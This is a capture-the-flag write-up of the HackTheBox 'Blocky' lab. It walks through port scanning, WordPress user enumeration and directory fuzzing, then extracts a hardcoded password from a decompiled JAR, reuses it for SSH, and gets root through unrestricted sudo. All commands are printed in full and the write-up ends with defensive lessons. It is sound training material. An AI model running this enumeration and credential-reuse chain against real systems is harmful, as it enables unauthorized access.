# HackTheBox Blocky — Easy Linux Machine Writeup

![HackTheBox](https://img.shields.io/badge/HackTheBox-Blocky-brightgreen?style=for-the-badge&logo=hackthebox)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Pentesting-blue?style=for-the-badge)
![Type](https://img.shields.io/badge/Type-Web%20%26%20PrivEsc-yellow?style=for-the-badge)

> **HackTheBox Blocky** is an Easy-difficulty Linux-based machine focused on WordPress enumeration, Java plugin reverse engineering, credential extraction, and trivial privilege escalation.

---

## 📋 Table of Contents

- [Machine Information](#machine-information)
- [Initial Nmap Enumeration](#initial-nmap-enumeration)
- [Port and Service Detection](#port-and-service-detection)
- [Domain Configuration](#domain-configuration)
- [WordPress Enumeration](#wordpress-enumeration)
- [User Identification with WPScan](#user-identification-with-wpscan)
- [Directory and File Fuzzing](#directory-and-file-fuzzing)
- [Plugin Directory Discovery](#plugin-directory-discovery)
- [Java JAR File Analysis](#java-jar-file-analysis)
- [Credential Extraction](#credential-extraction)
- [Initial Access with Discovered Credentials](#initial-access-with-discovered-credentials)
- [User Flag Retrieval](#user-flag-retrieval)
- [Privilege Escalation](#privilege-escalation)
- [Root Access and Flag Retrieval](#root-access-and-flag-retrieval)
- [Attack Chain Summary](#attack-chain-summary)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)

---

## 🖥️ Machine Information

| Property | Details |
|----------|---------|
| **Machine** | Blocky |
| **Platform** | HackTheBox |
| **Difficulty** | Easy |
| **Operating System** | Linux (Ubuntu) |
| **Target IP** | `10.129.95.121` |
| **Domain** | `blocky.htb` |
| **Primary Services** | FTP (21), SSH (22), HTTP (80), Minecraft (25565) |
| **Web Server** | Apache httpd 2.4.18 |
| **CMS** | WordPress |
| **SSH Version** | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 |
| **Minecraft Server** | Minecraft 1.11.2 |
| **Initial Access** | WordPress user credentials → SSH login |
| **Privilege Escalation** | Sudo ALL (trivial) |
| **Tools** | Nmap, WPScan, Feroxbuster, jd-gui, SSH |

---

## 🚀 Initial Nmap Enumeration

Today we are back with another **HackTheBox Easy-difficulty machine**, this time enumerating and exploiting the Linux-based machine named **Blocky**.

We have the target IP:

```
10.129.95.121
```

Starting with a comprehensive all-port scan to identify all exposed services.

### Full Port Scan

```bash
nmap -p- --min-rate 1000 10.129.95.121
```

**Result:**

```
Nmap scan report for 10.129.95.121
Host is up, received reset ttl 63 (0.26s latency).
Scanned at 2026-09-27 22:53:52 EDT for 221s
Not shown: 65530 filtered tcp ports (no-response)

PORT      STATE  SERVICE   REASON
21/tcp    open   ftp       syn-ack ttl 63
22/tcp    open   ssh       syn-ack ttl 63
80/tcp    open   http      syn-ack ttl 63
8192/tcp  closed sophos    reset ttl 63
25565/tcp open   minecraft syn-ack ttl 63
```

Five interesting ports were discovered:

- `21/tcp` — FTP (File Transfer Protocol)
- `22/tcp` — SSH (Secure Shell)
- `80/tcp` — HTTP (Web Server)
- `8192/tcp` — Sophos (Closed)
- `25565/tcp` — Minecraft Server

This is a **unique target with multiple services**, including a Minecraft server! 🎮

---

## 🔍 Port and Service Detection

### Service and Version Enumeration

```bash
nmap -sC -sV -p21,22,80,25565 10.129.95.121
```

**Result:**

```
Nmap scan report for 10.129.95.121
Host is up, received echo-reply ttl 63 (0.26s latency).
Scanned at 2026-09-27 22:58:17 EDT for 237s

PORT      STATE  SERVICE   REASON         VERSION
21/tcp    open   ftp?      syn-ack ttl 63
22/tcp    open   ssh       syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|   256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)

80/tcp    open   http      syn-ack ttl 63 Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)

25565/tcp open   minecraft syn-ack ttl 63 Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)

Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Key Findings:

✔️ **HTTP:** Apache httpd 2.4.18 with **virtual host `blocky.htb`**  
✔️ **SSH:** OpenSSH 7.2p2 — Secure access available  
✔️ **FTP:** Present but version unconfirmed  
✔️ **Minecraft:** 1.11.2 server running (unusual for pentesting)  
✔️ **Virtual Hosting:** Domain redirect to `blocky.htb`  

The HTTP server redirects to `blocky.htb`, indicating a **WordPress installation** on this domain.

---

## 🌐 Domain Configuration

### Adding Domain to Hosts File

The HTTP server redirects to `blocky.htb`, so we need to add this to our `/etc/hosts` file:

```bash
echo "10.129.95.121 blocky.htb" >> /etc/hosts
```

Or manually edit:

```bash
cat /etc/hosts | tail -n 2
# Add line:
10.129.95.121 blocky.htb
```

Now we can access the website via:

```
http://blocky.htb
```

---

## 📰 WordPress Enumeration

### Identifying WordPress

Visiting the website, we immediately identify:

- **CMS:** WordPress
- **Platform:** Popular blogging/content management system
- **Theme:** Active WordPress theme displayed
- **Footer:** WordPress branding visible

WordPress sites often contain:
- User information
- Plugin vulnerabilities
- Theme vulnerabilities
- Configuration files
- Database leaks

**WordPress is a common attack surface for web application penetration testing.**

---

## 🔍 User Identification with WPScan

### Running WPScan for User Enumeration

```bash
wpscan --url http://blocky.htb --enumerate u
```

**Key Options:**
- `--url` — Target WordPress site
- `--enumerate u` — Enumerate users

### WPScan Results

```
[i] User(s) Identified:

[+] notch
```

**Critical Finding:**
- **WordPress User:** `notch`
- This user likely has administrative or regular user privileges
- We can now attempt to crack this account or exploit vulnerabilities

### User Information

The username `notch` is exposed and can be used for:
- Brute force attacks on WordPress login
- Social engineering
- Cross-site interactions
- Privilege escalation attempts

---

## 📁 Directory and File Fuzzing

### Directory Discovery with Feroxbuster

While waiting for password cracking, we perform directory enumeration:

```bash
feroxbuster -u http://blocky.htb/ -w /usr/share/wordlists/dirb/common.txt
```

**Scan Progress:**

```
http://blocky.htb/ 
[>-------------------] - 2m       821/30000   8/s     http://blocky.htb/wp-content/ 
[####################] - 27s    30000/30000   1121/s  http://blocky.htb/wp-includes/ 
[>-------------------] - 2m       601/30000   6/s     http://blocky.htb/plugins/ 
[>-------------------] - 2m       517/30000   5/s     http://blocky.htb/wp-content/themes/ 
[####################] - 7s     30000/30000   4142/s  http://blocky.htb/wp-includes/random_compat/ 
[####################] - 15s    30000/30000   1992/s  http://blocky.htb/wp-includes/images/ 
[####################] - 19s    30000/30000   1559/s  http://blocky.htb/wp-includes/js/ 
[>-------------------] - 2m       363/30000   4/s     http://blocky.htb/index.php/2017/ 
[>-------------------] - 2m       466/30000   5/s     http://blocky.htb/wp-admin/ 
[>-------------------] - 2m       469/30000   5/s     http://blocky.htb/javascript/
```

### Key Directories Discovered:

- `/wp-admin/` — WordPress admin panel
- `/wp-includes/` — WordPress core files
- `/wp-content/` — User content and plugins
- `/plugins/` — **CRITICAL** WordPress plugins directory
- `/wp-content/themes/` — Theme files
- `/javascript/` — JavaScript resources

The **`/plugins/`** directory is particularly interesting and needs investigation!

---

## 🔌 Plugin Directory Discovery

### Accessing the Plugins Directory

```
http://blocky.htb/plugins/
```

### Directory Listing

Accessing this directory reveals:

```
📁 blockycore.jar
📁 BlockyCore.java
```

**Critical Discovery:**

Two files are directly accessible:
1. **blockycore.jar** — Compiled Java bytecode
2. **BlockyCore.java** — Java source code (unusual exposure)

This is a significant security issue:
- Java plugins should not be directly accessible
- Source code should never be exposed
- Compiled JARs can be decompiled to reveal logic

---

## ☕ Java JAR File Analysis

### Understanding JAR Files

A JAR (Java Archive) file is:
- A compressed archive containing compiled Java classes
- Similar to ZIP format
- Contains bytecode that can be decompiled
- Readable with tools like jd-gui or cfr

### Decompiling the JAR File

Using **jd-gui** (Java Decompiler GUI) or similar tools:

```bash
jd-gui blockycore.jar
```

Or via command line:

```bash
strings blockycore.jar | grep -i password
```

### Decompiled Code

```java
package com.myfirstplugin;

public class BlockyCore {
  public String sqlHost = "localhost";
  
  public String sqlUser = "root";
  
  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
  
  public void onServerStart() {}
  
  public void onServerStop() {}
  
  public void onPlayerJoin() {
    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
  }
  
  public void sendMessage(String username, String message) {}
}
```

### Extracted Information

**Critical Credentials Exposed:**

| Field | Value |
|-------|-------|
| **Database Host** | localhost |
| **Database User** | root |
| **Database Password** | `8YsqfCTnvxAUeduzjNSXe22` |

Additionally:
- TODO comment revealing incomplete development
- Minecraft server integration visible
- Weak development practices evident

**This is a catastrophic information disclosure!**

---

## 🔐 Credential Extraction

### Analyzing the Discovered Credentials

From the decompiled JAR file, we have:

```
Username: root
Password: 8YsqfCTnvxAUeduzjNSXe22
```

While these are database credentials, they might be:
1. Reused for other accounts
2. Related to the WordPress installation
3. Used for system administration
4. Reused by the `notch` user

### Testing Credential Reuse

A common mistake in development is password reuse across systems. Let's test:

- **WordPress Login:** `notch` with password `8YsqfCTnvxAUeduzjNSXe22`
- **SSH Login:** `notch` with same password
- **System Account:** Password reuse across platforms

---

## 🎯 Initial Access with Discovered Credentials

### SSH Login Attempt

```bash
ssh notch@10.129.95.121
```

Or with the domain:

```bash
ssh notch@blocky.htb
```

**Password:** `8YsqfCTnvxAUeduzjNSXe22`

### Successful Access

```bash
notch@Blocky:~$
```

✅ **Shell access achieved!**

**The credentials from the JAR file worked for SSH login!**

This demonstrates the critical security flaw of:
- Hardcoding credentials in code
- Reusing passwords across systems
- Storing credentials in accessible files

---

## 📄 User Flag Retrieval

### Listing Home Directory

```bash
ls
```

**Output:**

```
minecraft  user.txt
```

### Reading User Flag

```bash
cat user.txt
[USER FLAG CONTENT]
```

✅ **User flag retrieved!**

The user flag is directly accessible in the home directory.

---

## 🔐 Privilege Escalation

### Checking Sudo Privileges

```bash
sudo -l
```

**System Prompt:**

```
[sudo] password for notch: 
```

Enter the notch user's password (same credentials).

### Sudo Privileges Output

```
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/usr/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

### Critical Finding

**The notch user has UNRESTRICTED sudo privileges!**

```
(ALL : ALL) ALL
```

This means:
- Can run ANY command as ANY user (including root)
- No password prompt restrictions
- No command restrictions
- Direct root access available

**This is a trivial privilege escalation!**

---

## 👑 Root Access and Flag Retrieval

### Method 1: Using sudo su

```bash
sudo su
```

**System Prompt:**

```
root@Blocky:/home/notch#
```

✅ **Root shell obtained!**

### Reading Root Flag

```bash
cat /root/root.txt
[ROOT FLAG CONTENT]
```

✅ **Root flag retrieved!**

### Method 2: Using sudo -i (Alternative)

Another way to gain interactive root shell:

```bash
sudo -i
```

This provides an interactive login shell as root, similar to `su -`.

### Method 3: Direct Root Command Execution

```bash
sudo cat /root/root.txt
```

This executes the command directly as root without switching shells.

---

## 📊 Attack Chain Summary

```
                    ┌──────────────────────┐
                    │  HackTheBox Blocky   │
                    │   10.129.95.121      │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   Nmap Enumeration   │
                    │ 5 Ports Discovered   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Service Detection    │
                    │ WordPress on 80      │
                    │ Minecraft on 25565   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Domain Configuration │
                    │ blocky.htb           │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ WordPress Enum       │
                    │ Identified: notch    │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Directory Fuzzing    │
                    │ Feroxbuster Scan     │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ /plugins/ Discovery  │
                    │ JAR File Found       │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ JAR Decompilation    │
                    │ jd-gui Analysis      │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Credential Discovery │
                    │ DB Creds Extracted   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Credential Reuse     │
                    │ SSH Login Success    │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ User Flag Retrieved  │
                    │ /home/notch/user.txt │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Sudo Privilege Check │
                    │ (ALL : ALL) ALL      │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ sudo su Command      │
                    │ Root Shell Access    │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Root Flag Retrieved  │
                    │ /root/root.txt       │
                    └──────────────────────┘
```

---

## 💡 Key Takeaways

### 1. Information Disclosure in Source Code

Hardcoded credentials in source files are a critical vulnerability:
- Database passwords exposed
- API keys visible
- System credentials revealed
- Compiled JAR files can be decompiled

**Never hardcode credentials in code.**

### 2. Java Bytecode Decompilation

JAR files are easily decompiled:
- Compiled Java can be reversed to source code
- jd-gui and cfr tools are readily available
- No obfuscation means complete code review is possible
- Sensitive logic is exposed

**Protect compiled Java bytecode with obfuscation or access control.**

### 3. Password Reuse Across Systems

Using the same password for multiple systems is dangerous:
- Database password = SSH password
- Development credentials = production credentials
- Single point of failure compromises all systems

**Use unique, strong passwords for each system.**

### 4. Exposed Plugin Directories

WordPress plugins should not be publicly listed:
- Source code should not be accessible
- Compiled files should not be downloadable
- Plugin versions can reveal vulnerabilities

**Restrict access to plugin directories with proper file permissions and web server configuration.**

### 5. Unrestricted Sudo Privileges

Granting `(ALL : ALL) ALL` sudo access is dangerous:
- Equivalent to giving the user root access
- No audit trail for specific commands
- No restrictions on what can be executed

**Use principle of least privilege for sudo. Restrict to specific commands needed.**

### 6. Directory Enumeration Reveals Vulnerabilities

Feroxbuster quickly identified:
- Plugin directory
- Admin interface
- Content directories
- Theme locations

**Always perform comprehensive directory enumeration on web applications.**

### 7. Virtual Host Configuration

The HTTP redirect to `blocky.htb` required:
- DNS/hosts file configuration
- Virtual host awareness
- Domain-based access

**Always check for virtual host redirects and add them to /etc/hosts.**

### 8. WordPress User Enumeration

WPScan easily identified:
- WordPress installation
- Registered users
- Plugin information
- Theme information

**WordPress is extensively documented with automated enumeration tools available.**

### 9. Minecraft Server Presence

Unusual service like Minecraft indicates:
- Potential for lateral movement
- Additional attack surface
- Possible plugin vulnerabilities
- Server administration interface

**Investigate all services, not just typical web/SSH.**

### 10. Trivial Privilege Escalation

The privilege escalation was trivial because:
- Sudo was misconfigured
- No restrictions were enforced
- User had unrestricted root access
- Single `sudo su` command was sufficient

**Many Easy machines test basic security configuration mistakes.**

---

## 🛠️ Tools Used

| Tool | Purpose | Usage |
|------|---------|-------|
| **Nmap** | Port scanning and service enumeration | Port discovery |
| **WPScan** | WordPress enumeration and vulnerability scanning | User identification |
| **Feroxbuster** | Web directory discovery and brute forcing | Directory enumeration |
| **jd-gui** | Java decompiler for JAR analysis | Code review |
| **SSH** | Secure shell access | Initial access |
| **Sudo** | Privilege execution | Root access |

---

## 📝 Commands Used

### Nmap — Full Port Scan

```bash
nmap -p- --min-rate 1000 10.129.95.121
```

### Nmap — Service Enumeration

```bash
nmap -sC -sV -p21,22,80,25565 10.129.95.121
```

### Add Domain to Hosts File

```bash
echo "10.129.95.121 blocky.htb" >> /etc/hosts
```

### WPScan — User Enumeration

```bash
wpscan --url http://blocky.htb --enumerate u
```

### Feroxbuster — Directory Discovery

```bash
feroxbuster -u http://blocky.htb/ -w /usr/share/wordlists/dirb/common.txt
```

### Download JAR File

```bash
wget http://blocky.htb/plugins/blockycore.jar
```

### Decompile JAR File

```bash
jd-gui blockycore.jar
```

### SSH Login

```bash
ssh notch@blocky.htb
# Password: 8YsqfCTnvxAUeduzjNSXe22
```

### Check Sudo Privileges

```bash
sudo -l
# Password: 8YsqfCTnvxAUeduzjNSXe22
```

### Gain Root Shell

```bash
sudo su
# or
sudo -i
```

### Read User Flag

```bash
cat /home/notch/user.txt
```

### Read Root Flag

```bash
cat /root/root.txt
```

---

## 🎬 Final Attack Path

```
Port Scan (Nmap)
      ↓
Identify WordPress on Port 80
      ↓
Service Detection (Apache 2.4.18)
      ↓
Domain Redirect to blocky.htb
      ↓
Add Domain to /etc/hosts
      ↓
WordPress User Enumeration (WPScan)
      ↓
Identify User: notch
      ↓
Directory Fuzzing (Feroxbuster)
      ↓
Discover /plugins/ Directory
      ↓
Find blockycore.jar File
      ↓
Decompile JAR (jd-gui)
      ↓
Extract Credentials:
  root : 8YsqfCTnvxAUeduzjNSXe22
      ↓
Test Credential Reuse
      ↓
SSH Login as notch
      ↓
User Flag Retrieved
      ↓
Check Sudo Privileges
      ↓
sudo -l Shows (ALL : ALL) ALL
      ↓
sudo su
      ↓
Root Shell Access
      ↓
Root Flag Retrieved
```

---

## 🏁 Conclusion

The **HackTheBox Blocky** machine demonstrates fundamental security vulnerabilities:

1. **Information Disclosure** — Credentials in source code
2. **Exposed Plugins** — Direct access to plugin files
3. **Credential Reuse** — Same password across systems
4. **Misconfigured Sudo** — Unrestricted privilege elevation
5. **Lack of Access Control** — No restrictions on plugin directory access

### Most Important Lessons:

✔️ Never hardcode credentials in code  
✔️ Protect compiled files and source code from public access  
✔️ Use unique passwords for each system  
✔️ Implement principle of least privilege for sudo  
✔️ Restrict directory listings and plugin access  
✔️ WordPress is a common and well-documented target  
✔️ Java JAR files can be easily decompiled  
✔️ Directory enumeration reveals vulnerabilities  
✔️ Test all services, not just common ones  
✔️ Misconfigurations lead to trivial privilege escalation  

**The final result was complete system compromise with both user and root flags successfully retrieved.**

---

## 📌 References

- [HackTheBox](https://www.hackthebox.com/)
- [WPScan - WordPress Security Scanner](https://wpscan.com/)
- [Feroxbuster - Web Directory Brute Forcer](https://github.com/epi052/feroxbuster)
- [jd-gui - Java Decompiler](http://jd.benow.ca/)
- [OWASP - Information Disclosure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)

---

## 📚 Further Reading

- **WordPress Security:** Study WordPress vulnerabilities, plugin security, and theme security
- **Java Security:** Learn about Java bytecode obfuscation and secure credential management
- **Sudo Configuration:** Master sudoers file syntax and principle of least privilege
- **Web Application Security:** Deep dive into common web vulnerabilities and exploitation techniques
- **Credential Management:** Study best practices for storing and managing credentials securely

---

**Last Updated:** 2026-09-28  
**Author:** Naval = Sita Ram   
**Status:** ✅ Machine Compromised - Root Level Access Achieved
